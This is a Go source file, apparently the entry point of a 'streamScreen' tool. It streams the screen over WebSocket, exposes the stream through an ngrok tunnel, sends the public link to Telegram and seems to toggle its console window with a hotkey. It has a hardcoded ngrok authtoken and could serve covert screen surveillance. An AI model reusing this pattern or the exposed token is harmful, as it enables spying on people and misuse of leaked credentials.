package main

import (
	"context"
	_ "embed"
	"html/template"
	"log"
	"net/http"
	showConsol "streamScreen/showConsol"
	"streamScreen/stream"
	"streamScreen/telegram"

	"strings"

	"golang.ngrok.com/ngrok"
	"golang.ngrok.com/ngrok/config"
)

//go:embed stream_template.html
var streamTemplate string

func run(ctx context.Context) error {
	listener, err := ngrok.Listen(ctx,
		config.HTTPEndpoint(config.WithForwardsTo("localhost:8081")),
		ngrok.WithAuthtoken("2a1spZ5Tu8L7gSQAJaafnsG4bJc_2h9nDWzFKoZ3Z1qu7BLLu"),
	)
	if err != nil {
		log.Println("Error starting ngrok:", err)
		return err
	}

	appURL := listener.URL() + "/stream"
	log.Println("App URL", appURL)

	if err := telegram.SendTelegramMessageWithButton(appURL); err != nil {
		log.Println("Error sending message to Telegram:", err)
	}

	return http.Serve(listener, nil)
}

func main() {

	go showConsol.CheckHotkey()

	tmpl, err := template.New("stream").Parse(streamTemplate)

	if err != nil {
		log.Fatal("Error parsing template:", err)
	}

	http.HandleFunc("/ws", stream.WsStreamHandler)

	http.HandleFunc("/stream", func(w http.ResponseWriter, r *http.Request) {
		wsURL := ""
		if strings.Contains(r.Host, ":") {
			wsURL = "ws://" + r.Host + "/ws"
		} else {
			wsURL = "wss://" + r.Host + "/ws"
		}
		if err := tmpl.Execute(w, struct{ WebSocketURL string }{WebSocketURL: wsURL}); err != nil {
			http.Error(w, "Error executing template", http.StatusInternalServerError)
		}
	})

	go func() {
		log.Fatal(http.ListenAndServe(":8081", nil))
	}()

	go stream.SendVideoStream()

	if err := run(context.Background()); err != nil {
		log.Fatal(err)
	}
}
